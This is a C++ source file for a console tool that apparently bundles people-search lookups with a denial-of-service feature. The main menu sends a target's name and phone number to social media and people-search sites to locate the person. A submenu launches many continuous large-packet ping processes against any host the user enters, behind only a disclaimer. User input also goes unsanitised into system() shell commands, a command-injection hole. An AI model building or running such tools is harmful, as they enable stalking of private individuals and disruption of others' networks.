#include <iostream>
#include <string>
#include <vector>

void experimental(std::string, std::string);
void moreStuff();

int main() {
    const std::vector<std::string> webNames = {"https://www.facebook.com/search/top/?q=", "https://twitter.com/search?q=", "https://www.whitepages.com/name/", "https://www.whitepages.com/phone/",
    "https://www.google.com/search?q=", "https://www.usphonebook.com/", "https://www.searchpeoplefree.com/find/", "https://www.searchpeoplefree.com/phone-lookup/find/",
    "https://www.truepeoplesearch.com/results?name=", "https://www.truepeoplesearch.com/resultphone?phoneno="};
    std::cout << ("\033[1;35m\n"
        "__________.             _____       _____  _____.__\n"
        "|    |/ _|_____________/ ____\\_ ___/ ____\\/ ____\\  |   ____\n"
        "|     <_/ __  \\_ __ \\    __\\ | \\     __\\   __\\  |  | _/ __ \\ \n"
        "|    | \\  ___/|  | \\/|  | |  |  /|  |   |  |    |  |_\\  ___/\n"
        "|____|__\\___  >__|   |__| |____/ |__|   |__|    |____/\\___ >\n"
        "       \\/   \\/                                            \\/\n"
        "©2024 Inf Potentiality\n\n");
    while (true) {
        std::cout << ("\033[1;m\n"
            "==============================\n"
            "\n"
            "\033[1;34m1. Facebook \n"
            "2. Twitter \n"
            "3. Whitepages \n"
            "4. Google \n"
            "5. UsPhoneLookup \n"
            "6. Searchpeoplefree \n"
            "7. Truepeoplesearch  \n"
            "98. Experimental (all services) \n"
            "\033[1;m\n"
            "==============================\n"
            "\033[1;36m99. About\033[1;33m   100. Other Tools    0. Exit\033[1;m\n");
        int menu;
        int nameNum;
        std::string name;
        std::string num;
        std::cout << "\033[1;mInput service: ";
        std::cin >> menu;
        if (menu > 0 && menu < 99) {
            std::cout << "PLEASE NOTE: Many of these services rely on either names or numbers, "
                "so the chosen service may not work if one or both of the inputs are left blank." << std::endl;
            std::cout << "What is their name? (ENTER for none): ";
            std::getline(std::cin >> std::ws, name);
            std::cout << name << std::endl;
            std::cout << "What is their phone number? (ENTER for none): ";
            std::getline(std::cin >> std::ws, num);
            std::cout << num << std::endl;
        }
        switch (menu) {
        case 1:
            system(("start " + webNames[0] + name + "+" + num).c_str());
            break;
        case 2:
            system(("start " + webNames[1] + name + "+" + num).c_str());
            break;
        case 3:
            std::cout << "This service takes only either the name or number of a target; not both." << std::endl;
            while (true) {
                std::cout << "Enter '1' if you would like to search the name, or '2' if you would like to search the number: ";
                std::cin >> nameNum;
                if (nameNum != 1 && nameNum != 2) {
                    std::cout << "ERROR: Choice not either '1' or '2'" << std::endl;
                }
                else {
                    if (nameNum == 1) {
                        system(("start " + webNames[2] + name).c_str());
                    }
                    else if (nameNum == 2) {
                        system(("start " + webNames[3] + num).c_str());
                    }
                }
            }
            break;
        case 4:
            system(("start " + webNames[4] + name + "+" + num).c_str());
            break;
        case 5:
            system(("start " + webNames[5] + num).c_str());
            break;
        case 6:
            while (true) {
                std::cout << "Enter '1' if you would like to search the name, or '2' if you would like to search the number: ";
                std::cin >> nameNum;
                if (nameNum != 1 && nameNum != 2) {
                    std::cout << "ERROR: Choice not either '1' or '2'" << std::endl;
                }
                else {
                    if (nameNum == 1) {
                        system(("start " + webNames[6] + name).c_str());
                    }
                    else if (nameNum == 2) {
                        system(("start " + webNames[7] + num).c_str());
                    }
                }
            }
            break;
        case 7:
            std::cout << "This service takes only either the name or number of a target; not both." << std::endl;
            while (true) {
                std::cout << "Enter '1' if you would like to search the name, or '2' if you would like to search the number: ";
                std::cin >> nameNum;
                if (nameNum != 1 && nameNum != 2) {
                    std::cout << "ERROR: Choice not either '1' or '2'" << std::endl;
                }
                else {
                    if (nameNum == 1) {
                        system(("start " + webNames[8] + name).c_str());
                    }
                    else if (nameNum == 2) {
                        system(("start " + webNames[9] + num).c_str());
                    }
                }
            }
            break;
        case 98:
            system(("start " + webNames[0] + name + "+" + num).c_str());
            system(("start " + webNames[1] + name + "+" + num).c_str());
            system(("start " + webNames[2] + name).c_str());
            system(("start " + webNames[3] + num).c_str());
            system(("start " + webNames[4] + name + "+" + num).c_str());
            system(("start " + webNames[5] + num).c_str());
            system(("start " + webNames[6] + name).c_str());
            system(("start " + webNames[7] + num).c_str());
            system(("start " + webNames[8] + name).c_str());
            system(("start " + webNames[9] + num).c_str());
            break;
        case 99:
            std::cout << "\033[1;34mOne of the most simplistic and sub-par lookup tools ever made, mostly out of boredom. Input the name and/or number(s) of who you wanna find, and the OSINT gods bestow their knowledege upon thee (if any).\033[1;m";
            break;
        case 100:
            moreStuff();
            break;
        case 0:
            std::cout << "\033[1;34mThanks for using this!\n";
            std::cout << "\033[1;34mClosing...\033[1;m\n";
            return 0;
        }
    }
}

void moreStuff() {
    std::cout << ("\033[0;32m\n"
        "___  ___                     _          __  ___\n"
        "|  \\/  |                    | |        / _|/ __|\n"
        "| \\  / | ___  _ __ ___   ___| |_ _   _| |_| |_\n"
        "| |\\/| |/ _ \\| '__/ _ \\ / __| __| | | |  _|  _|\n"
        "| |  | | (_) | | |  __  \\__ \\ |_| |_| | | | |\n"
        "|_|  |_|\\___/|_|  \\___| |___/\\__|\\____|_| |_|\n"
        "Still ©2024 Inf Potentiality\n");
    while (true) {
        std::cout << ("\033[1;m\n"
            "==============================\n"
            "\033[1;34m\n"
            "1. DoS-ish\n"
            "\033[1;m\n"
            "==============================\n\n"
            "\033[1;36m 99. About\033[1;33m 0. Exit\033[1;m\n");
        int menu;
        std::cout << "\033[1;mInput service: ";
        std::cin >> menu;
        if (menu == 0) {
            std::cout << "\033[1;34mReturning to menu...";
            break;
        }
        std::string target;
        int bytes;
        int instances;
        switch (menu) {
        case 1:
            std::cout << "This program attempts a Denial of Service attack on whatever target you want." << std::endl;
            std::cout << "\033[1;33mDISCLAIMER: I am not responsible for misuse of this program. Only use this program with express permission from the person this is used on." << std::endl;

            std::cout << "\033[1;mInput target: ";
            std::cin >> target;
            while (true) {
                std::cout << "How many bytes of data per ping should be sent? (max 65500): ";
                std::cin >> bytes;
                if (bytes > 65500 || bytes <= 0) {
                    std::cout << "ERROR: invalid byte size" << std::endl;
                }
                else {
                    std::cout << "How many instances of the ping command should be initialized?: ";
                    std::cin >> instances;
                    if (instances > 0) {
                        break;
                    }
                    else {
                        std::cout << "ERROR: invalid instance number" << std::endl;
                    }
                }
            }
            for (int i = 0; i < instances; i++) {
                system(("start cmd /k ping " + target + " -l " + std::to_string(bytes) + " -t").c_str());
            }
            break;
        case 99:
            std::cout << "This is a continuation to the unpopular program by me, Kerfuffle. Now instead of JUST info gathering, there are even more sub-par things to do!" << std::endl;
        }
    }
}